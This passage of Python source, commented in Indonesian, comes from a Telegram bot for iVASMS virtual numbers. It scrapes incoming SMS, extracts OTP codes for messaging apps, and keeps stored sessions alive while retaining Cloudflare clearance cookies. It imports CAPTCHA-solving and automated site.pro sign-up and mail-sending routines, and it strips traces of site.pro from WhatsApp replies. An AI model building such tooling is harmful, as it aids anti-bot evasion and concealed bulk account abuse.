            f"✅ <b>Status:</b> Sukses Ditambahkan\n"
            f"{method_icon} <b>Metode:</b> <code>{method_display}</code>\n"
            f"{em(CE_WAKTU,'⏲')} <b>Waktu:</b> <code>{total_time} detik</code>"
            f"{bulk_info}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Powered by DikZz</i>"
        )
    else:
        error_detail = result.get('error', 'Gagal menambah nomor')
        text = (
            f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS FAILED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(CE_PROFILE,'👤')} <b>User:</b> <code>{user_id}</code>\n"
            f"{em(CE_EMAIL,'📩')} <b>Akun:</b> <code>{email}</code>\n"
            f"{em(E1,'⭐')} <b>Range:</b> <code>{target}</code>\n\n"
            f"❌ <b>Status:</b> Gagal Ditambahkan\n"
            f"{method_icon} <b>Metode:</b> <code>{method_display}</code>\n"
            f"{em(CE_WAKTU,'⏲')} <b>Waktu:</b> <code>{total_time} detik</code>\n"
            f"{em(E2,'⭐')} <b>Detail:</b> <code>{error_detail[:100]}</code>"
            f"{bulk_info}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Coba dengan range lain</i>"
        )

    if source == "live":
        reply_markup = InlineKeyboardMarkup([[
            InlineKeyboardButton("LIVE SMS", callback_data=f"live_sms_{user_id}", style="success"),
            InlineKeyboardButton("Export TXT", callback_data=f"export_txt_{user_id}", style="primary"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ]])
    else:
        reply_markup = get_result_keyboard(user_id)

    try:
        await msg_ref.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error sending result: {e}")



# Global state untuk monitoring SMS
# format: {user_id: { (time, sender, text, number) }}
notif_seen_sms = defaultdict(set)
active_notif_monitor = set()
notif_start_time = {}  # {user_id: datetime} untuk tracking durasi monitor
notif_last_check = {}  # {user_id: datetime} untuk debug last successful check
notif_sms_count = defaultdict(int)  # {user_id: int} jumlah SMS terdeteksi

# Global state untuk SMS AKTIF (user bot forwarding)
# User jalankan bot mereka sendiri untuk terima SMS real-time
sms_aktif_users = set()  # user_id yang aktif
sms_aktif_seen = defaultdict(set)  # {user_id: set of sms signatures}
sms_aktif_start_time = {}  # {user_id: datetime}
sms_aktif_count = defaultdict(int)  # {user_id: int} jumlah SMS terdeteksi


def _notif_clean(value):
    """Strip HTML tags + decode entities + escape supaya aman dipakai di
    pesan Telegram dengan parse_mode HTML."""
    if value is None:
        return ''
    try:
        s = str(value)
        # 1. Hapus <script>...</script> dan <style>...</style> beserta isinya
        s = re.sub(r'<\s*script[^>]*>[\s\S]*?<\s*/\s*script\s*>', '', s, flags=re.IGNORECASE)
        s = re.sub(r'<\s*style[^>]*>[\s\S]*?<\s*/\s*style\s*>', '', s, flags=re.IGNORECASE)
        # 2. Ganti <br> dan <p> jadi spasi/newline
        s = re.sub(r'<\s*br\s*/?\s*>', '\n', s, flags=re.IGNORECASE)
        s = re.sub(r'<\s*/?\s*p\s*[^>]*>', ' ', s, flags=re.IGNORECASE)
        # 3. Hapus semua tag HTML lainnya
        s = re.sub(r'<[^>]+>', '', s)
        s = html.unescape(s)
        # 4. Bersihkan whitespace berlebih (collapse multiple spaces/newlines)
        s = re.sub(r'[ \t]+', ' ', s)
        s = re.sub(r'\n\s*\n', '\n', s)
        s = html.escape(s, quote=False)
        return s.strip()
    except Exception:
        return ''


def _extract_otp(text):
    """Coba ekstrak OTP code dari isi SMS.
    Pola umum: 732-506, 123456, G-123456, 1234, dll."""
    if not text:
        return None
    try:
        plain = re.sub(r'<[^>]+>', '', str(text))
        plain = html.unescape(plain)
        # 1. Pola dengan dash (contoh: 732-506, 123-456-789)
        m = re.search(r'\b(\d{3,4}[-\s]?\d{3,4}(?:[-\s]?\d{3,4})?)\b', plain)
        if m:
            code = m.group(1).strip()
            digits_only = re.sub(r'[^\d]', '', code)
            if 4 <= len(digits_only) <= 10:
                return code
        # 2. Pola murni angka 4-8 digit
        m = re.search(r'\b(\d{4,8})\b', plain)
        if m:
            return m.group(1)
        # 3. Pola dengan prefix huruf (G-123456)
        m = re.search(r'\b([A-Z]-?\d{4,8})\b', plain)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def _send_to_user_bot(bot_token, chat_id, text, reply_markup_dict=None):
    """Kirim pesan ke bot milik user (blocking, jalankan di executor).
    reply_markup_dict: dict InlineKeyboardMarkup format Telegram API."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        if reply_markup_dict:
            payload['reply_markup'] = json.dumps(reply_markup_dict)
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            return True, resp.json()
        else:
            return False, resp.text
    except Exception as e:
        return False, str(e)


def _delete_user_bot_msg(bot_token, chat_id, message_id):
    """Hapus pesan di bot user (blocking, jalankan di executor)."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/deleteMessage"
        payload = {'chat_id': chat_id, 'message_id': message_id}
        resp = requests.post(url, json=payload, timeout=10)
        return resp.status_code == 200
    except:
        return False


def _validate_bot_token(bot_token):
    """Validasi bot token dengan memanggil getMe. Return (success, bot_info_or_error)."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getMe"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                return True, data['result']
        return False, resp.text
    except Exception as e:
        return False, str(e)


def get_user_bot_token(user_id):
    """Ambil bot token user dari database. Return (bot_token, chat_id, is_active, app_filter) or (None,None,None,None)."""
    try:
        cur.execute("SELECT bot_token, chat_id, is_active, app_filter FROM user_bot_tokens WHERE user_id = ?", (user_id,))
        row = cur.fetchone()
        if row:
            return row[0], row[1], row[2], row[3] or 'all'
    except Exception:
        pass
    return None, None, None, None


def save_user_bot_token(user_id, bot_token, chat_id, app_filter='all'):
    """Simpan/update bot token user."""
    try:
        cur.execute("""
            INSERT INTO user_bot_tokens (user_id, bot_token, chat_id, is_active, app_filter)
            VALUES (?, ?, ?, 1, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                bot_token = excluded.bot_token,
                chat_id = excluded.chat_id,
                is_active = 1,
                app_filter = excluded.app_filter,
                created_at = CURRENT_TIMESTAMP
        """, (user_id, bot_token, chat_id, app_filter))
        conn.commit()
        return True
    except Exception as e:
        print(f"[SMS_AKTIF] Error save token: {e}")
        return False


def update_user_app_filter(user_id, app_filter):
    """Update app filter saja tanpa ubah token."""
    try:
        cur.execute("UPDATE user_bot_tokens SET app_filter = ? WHERE user_id = ?", (app_filter, user_id))
        conn.commit()
        return True
    except Exception:
        return False


def delete_user_bot_token(user_id):
    """Hapus bot token user."""
    try:
        cur.execute("DELETE FROM user_bot_tokens WHERE user_id = ?", (user_id,))
        conn.commit()
        return True
    except Exception:
        return False


async def sms_aktif_task(context: ContextTypes.DEFAULT_TYPE):
    """Background task SMS AKTIF - cek setiap 5 detik, kirim ke bot user sendiri.
    Multi-app fetch (WhatsApp, Telegram, TikTok, dll) dan merge.
    First run: seed seen set silently, lalu kirim SEMUA SMS baru."""
    try:
        if not sms_aktif_users:
            return

        for user_id in list(sms_aktif_users):
            try:
                bot_token, chat_id, is_active, app_filter = get_user_bot_token(user_id)
                if not bot_token or not chat_id or not is_active:
                    sms_aktif_users.discard(user_id)
                    continue
                app_filter = app_filter or 'all'

                _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
                if not logged_in or not cookies_dict or not csrf:
                    print(f"[SMS_AKTIF] User {user_id}: session invalid")
                    continue

                session = requests.Session()
                for key, value in cookies_dict.items():
                    session.cookies.set(key, value)

                data = await bg.run(user_id, fetch_live_sms_all, session, csrf, "", 15, app_filter)
                if not data or 'data' not in data:
                    print(f"[SMS_AKTIF] User {user_id}: no data returned")
                    continue

                items = data.get('data', [])
                if not items:
                    print(f"[SMS_AKTIF] User {user_id}: data empty (0 items)")
                    continue

                # Kirim SEMUA SMS baru (yang belum di seen)
                new_count = 0
                for item in items:
                    range_name = item.get('range', 'Unknown')
                    source_app = item.get('_source_app', '')
                    termination = item.get('termination', {})
                    test_number = termination.get('test_number', 'Unknown') if isinstance(termination, dict) else 'Unknown'
                    sender = item.get('originator', 'Unknown')
                    message = item.get('messagedata', '-')
                    recv_time = item.get('senttime', '-')

                    sms_sig = (recv_time, sender, message, test_number)
                    if sms_sig in sms_aktif_seen[user_id]:
                        continue

                    sms_aktif_seen[user_id].add(sms_sig)
                    if len(sms_aktif_seen[user_id]) > 500:
                        try:
                            sms_aktif_seen[user_id].pop()
                        except KeyError:
                            pass

                    # Detect service - gunakan _source_app dari multi-fetch
                    service = source_app if source_app else "Unknown"
                    if service == "Unknown":
                        msg_lower = (message or '').lower()
                        sender_lower = (sender or '').lower()
                        if 'whatsapp' in msg_lower or 'whatsapp' in sender_lower:
                            service = "WhatsApp"
                        elif 'telegram' in msg_lower or 'telegram' in sender_lower:
                            service = "Telegram"
                        elif 'tiktok' in msg_lower or 'tiktok' in sender_lower:
                            service = "TikTok"
                        elif 'facebook' in msg_lower or 'meta' in sender_lower or 'fb' in sender_lower:
                            service = "Facebook"
                        elif 'instagram' in msg_lower or 'instagram' in sender_lower:
                            service = "Instagram"
                        elif 'microsoft' in msg_lower or 'microsoft' in sender_lower:
                            service = "Microsoft"
                        elif 'google' in msg_lower or 'google' in sender_lower:
                            service = "Google"
                        elif 'viber' in msg_lower or 'viber' in sender_lower:
                            service = "Viber"

                    # App filter: skip jika tidak sesuai filter user
                    if app_filter and app_filter != 'all':
                        if service.lower() != app_filter.lower():
                            continue

                    new_count += 1
                    sms_aktif_count[user_id] = sms_aktif_count.get(user_id, 0) + 1

                    safe_range = _notif_clean(range_name)
                    safe_number = _notif_clean(test_number)
                    safe_sender = _notif_clean(sender)
                    safe_msg = _notif_clean(message)
                    safe_time = _notif_clean(recv_time)
                    otp_code = _extract_otp(message)
                    safe_otp = _notif_clean(otp_code) if otp_code else ''

                    otp_block = ''
                    if safe_otp:
                        otp_block = (
                            f"\n┌──────────────────────────┐\n"
                            f"│ 🔑 <b>OTP/CODE</b>\n"
                            f"│ <code>{safe_otp}</code>  (tap to copy)\n"
                            f"└──────────────────────────┘\n"
                        )

                    # Jika From sama dengan Service, hanya tampilkan Service
                    from_line = ""
                    if safe_sender and safe_sender.lower().strip() != service.lower().strip():
                        from_line = f"📩 <b>From</b>    : <code>{safe_sender}</code>\n"

                    # Dynamic service emoji
                    _svc_lower = service.lower().strip()
                    _svc_icon = '🏷'
                    if 'whatsapp' in _svc_lower: _svc_icon = '💬'
                    elif 'telegram' in _svc_lower: _svc_icon = '✈️'
                    elif 'tiktok' in _svc_lower: _svc_icon = '🎵'
                    elif 'facebook' in _svc_lower or 'meta' in _svc_lower: _svc_icon = '👥'
                    elif 'instagram' in _svc_lower: _svc_icon = '📷'
                    elif 'google' in _svc_lower: _svc_icon = '🔍'
                    elif 'microsoft' in _svc_lower: _svc_icon = '💻'
                    elif 'viber' in _svc_lower: _svc_icon = '📞'

                    notif_text = (
                        f"✨ <b>SMS AKTIF • NEW</b> {_svc_icon}\n"
                        f"══════════════════════\n"
                        f"{otp_block}"
                        f"📍 <b>Range</b>   │ <code>{safe_range}</code>\n"
                        f"📞 <b>Nomor</b>   │ <code>+{safe_number}</code>\n"
                        f"{from_line}"
                        f"{_svc_icon} <b>Service</b> │ <code>{service}</code>\n"
                        f"🕒 <b>Time</b>    │ <code>{safe_time}</code>\n\n"
                        f"📩 <b>Message</b>\n"
                        f"<blockquote>{safe_msg}</blockquote>\n"
                        f"══════════════════════\n"
                        f"📡 <i>Real-time Monitor • Auto-del 5m</i>"
                    )

                    # Inline keyboard for user bot
                    reply_markup = None
                    if safe_otp:
                        reply_markup = {
                            'inline_keyboard': [[
                                {'text': f'📋 SALIN: {safe_otp}', 'callback_data': f'copy_{safe_otp}'}
                            ], [
                                {'text': '🛑 STOP SMS AKTIF', 'callback_data': f'stop_smsaktif_{user_id}'}
                            ]]
                        }
                    else:
                        reply_markup = {
                            'inline_keyboard': [[
                                {'text': '🛑 STOP SMS AKTIF', 'callback_data': f'stop_smsaktif_{user_id}'}
                            ]]
                        }

                    # Send via user's bot
                    success, resp_data = await bg.run(
                        user_id, _send_to_user_bot,
                        bot_token, chat_id, notif_text, reply_markup
                    )

                    # Schedule auto-delete setelah 5 menit
                    if success and isinstance(resp_data, dict):
                        msg_id = resp_data.get('result', {}).get('message_id')
                        if msg_id:
                            asyncio.get_event_loop().call_later(
                                300,  # 5 menit = 300 detik
                                lambda bt=bot_token, ci=chat_id, mi=msg_id: asyncio.ensure_future(
                                    bg.run(user_id, _delete_user_bot_msg, bt, ci, mi)
                                )
                            )

                    await asyncio.sleep(0.3)

                if new_count > 0:
                    print(f"[SMS_AKTIF] User {user_id}: sent {new_count} new SMS")

            except Exception as e:
                print(f"[SMS_AKTIF] Error for user {user_id}: {e}")

    except Exception as e:
        print(f"[SMS_AKTIF] Global Error: {e}")


async def delete_message_job(context: ContextTypes.DEFAULT_TYPE):
    """Job untuk menghapus pesan setelah 10 menit"""
    data = context.job.data
    chat_id = data.get('chat_id')
    message_id = data.get('message_id')
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        print(f"[NOTIF] Pesan {message_id} dihapus otomatis (Expired 10m)")
    except Exception as e:
        print(f"[NOTIF] Gagal hapus pesan: {e}")


async def send_sms_retry_job(context: ContextTypes.DEFAULT_TYPE):
    """Job untuk mengirim ulang SMS jika sebelumnya gagal karena rate limit atau network timeout"""
    job_data = context.job.data
    user_id = job_data['user_id']
    text = job_data['text']
    keyboard = job_data['keyboard']
    attempts = job_data.get('attempts', 1)
    
    try:
        msg = await context.bot.send_message(
            chat_id=user_id,
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
        if context.job_queue:
            context.job_queue.run_once(
                delete_message_job,
                when=600,
                data={'chat_id': user_id, 'message_id': msg.message_id}
            )
        print(f"[NOTIF-RETRY] Berhasil mengirim SMS ke {user_id} pada percobaan ke-{attempts}")
    except Exception as e:
        print(f"[NOTIF-RETRY] Percobaan ke-{attempts} gagal untuk {user_id}: {e}")
        if attempts < 5:
            # Jadwalkan ulang dalam 15 detik
            job_data['attempts'] = attempts + 1
            if context.job_queue:
                context.job_queue.run_once(send_sms_retry_job, when=15, data=job_data)


async def notif_monitor_task(context: ContextTypes.DEFAULT_TYPE):
    """Cek SMS masuk via endpoint resmi /portal/sms/received (3-layer scraping):
    1. /getsms          -> daftar range yang punya SMS hari ini
    2. /getsms/number   -> daftar nomor di tiap range
    3. /getsms/number/sms -> isi SMS tiap nomor
    Sama persis seperti yang dipakai di halaman SMS Statistics web ivasms."""
    try:
        if not active_notif_monitor:
            return

        for user_id in list(active_notif_monitor):
            try:
                _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
                if not logged_in or not cookies_dict or not csrf:
                    print(f"[NOTIF] User {user_id}: session invalid, removing from monitor")
                    active_notif_monitor.discard(user_id)
                    continue

                stored_ua = get_stored_user_agent(user_id)
                session, _ = _ivas_session(cookies_dict, stored_ua)
                csrf = await bg.run(user_id, ensure_csrf_fresh, session, csrf)

                # 1. Ambil ranges hari ini
                print(f"[NOTIF] User {user_id}: fetching ranges...")
                html_ranges = await bg.run(user_id, fetch_client_ranges, session, csrf)
                if not html_ranges:
                    print(f"[NOTIF] User {user_id}: fetch_client_ranges returned None/empty")
                    continue
                ranges = parse_client_ranges(html_ranges)
                if not ranges:
                    print(f"[NOTIF] User {user_id}: no ranges with SMS today (parsed 0 ranges)")
                    # Update last check time even if no ranges
                    notif_last_check[user_id] = datetime.now()
                    continue

                # Batasi beban API (prioritas range dengan SMS terbanyak)
                ranges = sorted(ranges, key=lambda x: x.get('count', 0), reverse=True)[:12]
                print(f"[NOTIF] User {user_id}: found {len(ranges)} ranges: {[r['name'] for r in ranges]}")

                # 2. Ambil nomor untuk semua range (sequential with small delay)
                all_sms_tasks = []
                for rng in ranges:
                    try:
                        html_numbers = await bg.run(
                            user_id, fetch_range_numbers, session, csrf, rng['name']
                        )
                        numbers = parse_range_numbers(html_numbers)
                        print(f"[NOTIF] User {user_id}: range '{rng['name']}' -> {len(numbers)} numbers")
                        for num in numbers:
                            all_sms_tasks.append((num, rng['name']))
                        await asyncio.sleep(0.3)  # Hindari rate limit
                    except Exception as e:
                        print(f"[NOTIF] User {user_id}: error fetching numbers for '{rng['name']}': {e}")

                # Limit nomor per siklus (hindari rate limit 60/min)
                all_sms_tasks = all_sms_tasks[:25]
                if not all_sms_tasks:
                    print(f"[NOTIF] User {user_id}: no numbers found across all ranges")
                    notif_last_check[user_id] = datetime.now()
                    continue

                print(f"[NOTIF] User {user_id}: fetching SMS for {len(all_sms_tasks)} numbers...")

                # 3. Ambil SMS untuk semua nomor (sequential with small delay)
                sms_results = []
                for num, rname in all_sms_tasks:
                    try:
                        html_sms = await bg.run(
                            user_id, fetch_number_messages, session, csrf, num, rname
                        )
                        messages = parse_number_sms(html_sms)
                        sms_results.append((num, rname, messages))
                        await asyncio.sleep(0.2)  # Hindari rate limit
                    except Exception as e:
                        print(f"[NOTIF] User {user_id}: error fetching SMS for {num}: {e}")

                notif_last_check[user_id] = datetime.now()

                # First run hanya seed history (jangan spam SMS lama)
                first_run = len(notif_seen_sms[user_id]) == 0
                if first_run:
                    print(f"[NOTIF] User {user_id}: FIRST RUN - seeding history only")

                new_sms_count = 0
                for num, rname, messages in sms_results:
                    if not messages:
                        continue

                    for sms in messages:
                        sender_raw = sms.get('sender', '')
                        text_raw = sms.get('text', '')
                        time_raw = sms.get('time', '')

                        sms_sig = (time_raw, sender_raw, text_raw, num)
                        if sms_sig in notif_seen_sms[user_id]:
                            continue

                        notif_seen_sms[user_id].add(sms_sig)
                        if len(notif_seen_sms[user_id]) > 500:
                            try:
                                notif_seen_sms[user_id].pop()
                            except KeyError:
                                pass

                        if first_run:
                            continue

                        app_filter = get_user_prefs(user_id).get('monitor_app_filter', 'all')
                        if not _sms_matches_app_filter(sender_raw, text_raw, app_filter):
                            continue

                        new_sms_count += 1
                        notif_sms_count[user_id] = notif_sms_count.get(user_id, 0) + 1
                        print(f"[NOTIF] User {user_id}: NEW SMS from {sender_raw} to {num}")

                        otp_code = _extract_otp(text_raw)
                        revenue_raw = sms.get('revenue', '')
                        text, safe_otp = _build_monitor_notif_text(
                            sender_raw, text_raw, time_raw, num, rname,
                            otp_code=otp_code, revenue=revenue_raw,
                        )
                        keyboard = _monitor_notif_keyboard(user_id, safe_otp)

                        try:
                            msg = await context.bot.send_message(
                                chat_id=user_id,
                                text=text,
                                parse_mode=ParseMode.HTML,
                                reply_markup=keyboard,
                                disable_web_page_preview=True
                            )

                            if context.job_queue:
                                context.job_queue.run_once(
                                    delete_message_job,
                                    when=600,
                                    data={'chat_id': user_id, 'message_id': msg.message_id}
                                )
                        except Exception as e:
                            print(f"[NOTIF] Error kirim msg ke {user_id}: {e}. Masuk antrian retry.")
                            if context.job_queue:
                                try:
                                    context.job_queue.run_once(
                                        send_sms_retry_job,
                                        when=5,
                                        data={
                                            'user_id': user_id,
                                            'text': text,
                                            'keyboard': keyboard,
                                            'attempts': 1
                                        }
                                    )
                                except Exception as je:
                                    print(f"[NOTIF] Gagal menjadwalkan retry: {je}")

                if first_run:
                    seeded = len(notif_seen_sms[user_id])
                    print(f"[NOTIF] User {user_id}: seeded {seeded} existing SMS signatures")
                elif new_sms_count > 0:
                    print(f"[NOTIF] User {user_id}: sent {new_sms_count} new SMS notifications")
                else:
                    print(f"[NOTIF] User {user_id}: no new SMS this cycle")

            except Exception as e:
                print(f"[NOTIF] Error monitor for user {user_id}: {e}")
                import traceback
                traceback.print_exc()

    except Exception as e:
        print(f"[NOTIF] Global Error: {e}")
        import traceback
        traceback.print_exc()


def _keep_alive_ping(cookies, csrf):
    """Blocking ping ke /portal/profile. Dijalankan di thread executor.
    Return tuple (status_code_or_None, merged_cookies_dict_or_None, error_str_or_None)."""
    try:
        s = requests.Session()
        s.cookies.update(cookies)
        s.headers.update({
            'User-Agent': s.headers.get('User-Agent', get_random_user_agent()),
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-TOKEN': csrf,
            'Accept': 'application/json'
        })
        url = f"{BASE_URL}/portal/profile"
        resp = s.get(url, timeout=15)

        # Merge: mulai dari cookies lama (preserve cf_clearance, _fbp, dll
        # yang biasanya tidak di-resend server), lalu overlay value baru.
        merged = dict(cookies)
        try:
            for c in s.cookies:
                if c.value:
                    merged[c.name] = c.value
        except Exception:
            merged.update(s.cookies.get_dict())
        return resp.status_code, merged, None
    except Exception as e:
        return None, None, str(e)


async def keep_alive_task(context: ContextTypes.DEFAULT_TYPE):
    """Background task untuk merefresh semua session agar tidak expired (setiap 5 menit).
    HTTP request dijalankan di thread executor supaya tidak blocking event loop."""
    try:
        # Ambil SEMUA session dari database
        cur.execute("SELECT user_id, email, session_data FROM user_sessions")
        all_sessions = cur.fetchall()
        
        if not all_sessions:
            return

        print(f"\n[KEEP-ALIVE] Merefresh {len(all_sessions)} akun...")
        
        for user_id, email, session_data_json in all_sessions:
            try:
                data = json.loads(session_data_json)
                cookies = data.get('cookies')
                csrf = data.get('csrf')
                
                if not cookies or not csrf:
                    continue
                
                # Jalankan HTTP call di thread agar event loop tidak nge-hang.
                status, merged_cookies, err = await bg.run(user_id, _keep_alive_ping, cookies, csrf)

                if err is not None:
                    print(f"  ✗ {email}: Error {err}")
                elif status == 200:
                    print(f"  ✓ {email}: OK")
                    # Update cookies terbaru jika ada perubahan dari server,
                    # tapi pakai MERGE supaya cf_clearance/_fbp tidak hilang.
                    if merged_cookies and merged_cookies != cookies:
                        data['cookies'] = merged_cookies
                        cur.execute(
                            "UPDATE user_sessions SET session_data = ? WHERE user_id = ? AND email = ?",
                            (json.dumps(data), user_id, email),
                        )
                        conn.commit()
                elif status == 401:
                    print(f"  ✗ {email}: Status 401 - Menghapus dari database...")
                    cur.execute("DELETE FROM user_sessions WHERE user_id = ? AND email = ?", (user_id, email))
                    conn.commit()
                else:
                    print(f"  ✗ {email}: Status {status}")
            except Exception as e:
                print(f"  ✗ {email}: Error {e}")
            
            # Kasih jeda dikit biar gak kaget servernya (non-blocking)
            await asyncio.sleep(0.5)
                
    except Exception as e:
        print(f"[KEEP-ALIVE] Error global: {e}")

async def accounts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Menampilkan daftar akun untuk Multi-Account Management"""
    user_id = update.effective_user.id
    
    cur.execute("SELECT email, is_active FROM user_sessions WHERE user_id = ? ORDER BY email ASC", (user_id,))
    accounts = cur.fetchall()
    
    if not accounts:
        await update.message.reply_text(
            f"{_no_session_text()}",
            parse_mode=ParseMode.HTML
        )
        return

    text = f"{em(CE_AKUN,'👤')} <b>PENGELOLA AKUN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    keyboard = []
    
    for email, is_active in accounts:
        status = "🟢 <b>AKTIF</b>" if is_active else "⚪️ Terdaftar"
        text += f"{em(E1,'⭐')} <code>{email}</code>\n  └ Status: {status}\n\n"
        
        # Tombol untuk switch jika tidak aktif
        if not is_active:
            keyboard.append([InlineKeyboardButton(f"Ganti ke: {email}", callback_data=f"switch_acc_{email}", style="primary")])
    
    text += f"━━━━━━━━━━━━━━━━━━━━━━\n{em(E4,'🎧')} <i>Klik tombol di bawah untuk berpindah akun.</i>"
    
    keyboard.append([
        InlineKeyboardButton("TAMBAH AKUN BARU", callback_data=f"menu_cookies_{user_id}", icon_custom_emoji_id=CE_ADD, style="success")
    ])
    keyboard.append([InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )

async def build_home_text(user_id, first_name, context=None):
    """Bangun teks menu utama dengan dashboard ringkas."""
    email, profile_name, country, phone, cookies_dict, csrf, logged_in = get_user_session(user_id)
    prefs = get_user_prefs(user_id)

    if logged_in and email:
        email_status = f"<code>{email}</code>"
        profile_parts = []
        if profile_name:
            profile_parts.append(f"{em(CE_PROFILE,'👤')} <b>Nama</b>: {profile_name}")
        if country:
            flag = get_country_flag(country)
            profile_parts.append(f"{em(CE_NEGARA,'🌏')} <b>Negara</b>: {flag} {country}")
        if phone:
            profile_parts.append(f"{em(CE_NOMOR,'📞')} <b>Telepon</b>: <code>{phone}</code>")
        profile_info = "\n".join(profile_parts)
    else:
        email_status = "<i>Belum Login</i>"
        profile_info = ""

    dashboard_info = ""
    session_warn = ""
    if logged_in and email and cookies_dict and csrf:
        mon_st = '🟢' if user_id in active_notif_monitor else '🔴'
        aktif_st = '🟢' if user_id in sms_aktif_users else '🔴'
        fav_count = len(get_favorite_ranges(user_id, limit=99))
        dashboard_info = (
            f"\n{em(E1,'📊')} <b>Dashboard</b>\n"
            f"  {em(CE_MONITOR,'📡')} Monitor: {mon_st}  │  SMS Aktif: {aktif_st}\n"
            f"  {em(E2,'🏷')} Filter: {_app_filter_label(prefs.get('monitor_app_filter', 'all'))}\n"
            f"  {em(CE_ADD,'⭐')} Favorit: <code>{fav_count}</code> range\n"
        )
        stats = None
        err = None
        cache_key = f'dash_stats_{user_id}'
        cached = context.user_data.get(cache_key) if context else None
        if cached and (time.time() - cached.get('ts', 0)) < DASHBOARD_CACHE_SEC:
            stats, err = cached.get('stats'), cached.get('err')
        else:
            stats, err = await bg.run(user_id, fetch_user_sms_stats, user_id, email, cookies_dict, csrf)
            if context is not None:
                context.user_data[cache_key] = {'ts': time.time(), 'stats': stats, 'err': err}
        if stats:
            dashboard_info += (
                f"  {em(E1,'📩')} SMS Hari Ini: <code>{stats['count']}</code>\n"
                f"  {em(E1,'💰')} Revenue: <code>{stats['revenue']}</code>\n"
            )
        elif err and any(x in str(err).lower() for x in ('expired', 'invalid', 'login')):
            session_warn = f"\n{em(E2,'⚠️')} <b>Session mungkin expired!</b> Login ulang via /cookies\n"

        try:
            cur.execute(
                "SELECT last_used FROM user_sessions WHERE user_id = ? AND is_active = 1",
                (user_id,),
            )
            lu = cur.fetchone()
            if lu and lu[0]:
                last_used = datetime.fromisoformat(lu[0].replace(' ', 'T') if 'T' not in lu[0] else lu[0])
                hours_ago = (datetime.now() - last_used).total_seconds() / 3600
                if hours_ago >= SESSION_WARN_HOURS and not session_warn:
                    session_warn = (
                        f"\n{em(E2,'⚠️')} Session terakhir dipakai <code>{int(hours_ago)}j</code> lalu. "
                        f"Pertimbangkan login ulang.\n"
                    )
        except Exception:
            pass

    onboard_tip = ""
    if not prefs.get('onboarded'):
        onboard_tip = (
            f"\n{em(E3,'💡')} <i>Baru di sini? Tap <b>BANTUAN</b> atau ketik /help</i>\n"
        )
        set_user_pref(user_id, onboarded=True)

    return _build(
        TEMPLATE_MAIN, 'IVASMS · NUMBER MANAGER',
        name=first_name,
        user_id=user_id,
        email_status=email_status,
        profile_info=profile_info,
        dashboard_info=dashboard_info,
        session_warn=session_warn,
        onboard_tip=onboard_tip,
    )


# ════════════════════════════════════════════════════════════════
#  IMPORT SITE.PRO FIX MODULE
# ════════════════════════════════════════════════════════════════
from sitepro_fix_module import (
    emailqu_get_temp_email, emailqu_poll_inbox, emailqu_extract_otp,
    solve_recaptcha,
    sitepro_get_csrf, sitepro_register, sitepro_confirm_code,
    sitepro_create_website, sitepro_create_mailbox,
    sitepro_open_webmail, roundcube_get_compose_token, roundcube_send_email,
    roundcube_read_inbox,
    run_fix_pipeline, run_create_pipeline, run_fix_multi_pipeline,
    _sitepro_session, _random_name, _random_password, _random_email_user,
    sitepro_register_browser, sitepro_restore_session,
    MAX_SENDS_PER_ACCOUNT, MAX_MAILBOXES_PER_ACCOUNT,
    SENDER_COOLDOWN_SECS, SENDER_REFRESH_SECS,
    refresh_all_sessions,
)


def _sitepro_refresh_daemon():
    """Daemon: tiap 10 menit refresh session semua akun Site.pro biar tidak mati."""
    # Tunggu sebentar biar bot selesai bootstrap dulu
    time.sleep(60)
    while True:
        try:
            ok, total = refresh_all_sessions(cur, conn)
            if total:
                print(f"[SITEPRO] Refresh session: {ok}/{total} akun hidup")
        except Exception as e:
            print(f"[SITEPRO] Refresh daemon error: {e}")
        time.sleep(SENDER_REFRESH_SECS)


def _clean_wa_reply(text: str) -> str:
    """Hilangkan jejak email account & domain site.pro dari body balasan.

    - Hapus alamat email yang muncul.
    - Hapus baris yang menyebut 'site.pro' (case-insensitive).
    - Rapikan whitespace berlebih.
    """
    if not text:
        return ""
    try:
        import re as _re
        # Hilangkan alamat email apapun
        cleaned = _re.sub(r"[\w\.\-+]+@[\w\.\-]+\.[A-Za-z]{2,}", "", text)
        # Hilangkan baris yang menyebut site.pro
        lines = []
        for ln in cleaned.splitlines():
            if 'site.pro' in ln.lower():
                continue
            lines.append(ln)
        cleaned = "\n".join(lines)
        # Hilangkan kata 'site.pro' sisa (jika ada inline)
        cleaned = _re.sub(r"(?i)site\.pro", "", cleaned)
        # Rapikan baris kosong berlebih
        cleaned = _re.sub(r"\n{3,}", "\n\n", cleaned).strip()
        return cleaned
    except Exception:
        return text


# ════════════════════════════════════════════════════════════════
